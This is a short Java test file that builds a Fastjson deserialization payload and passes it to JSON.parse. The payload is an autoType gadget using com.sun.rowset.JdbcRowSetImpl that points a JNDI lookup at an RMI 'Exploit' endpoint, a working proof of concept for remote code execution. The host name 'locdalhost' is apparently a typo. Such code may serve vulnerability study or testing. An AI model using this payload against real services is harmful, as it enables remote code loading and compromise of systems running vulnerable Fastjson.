import com.alibaba.fastjson.JSON;

public class TestMain {
    public static void main(String[] args) {
        String payload = "{\"name\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"}," +
                "\"xxxx\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":" +
                "\"rmi://locdalhost:1099/Exploit\",\"autoCommit\":true}}}";
        JSON.parse(payload);
       // JSON.parseObject(JSON.toJSONString(objectResponseEntity.getBody()));
    }
}
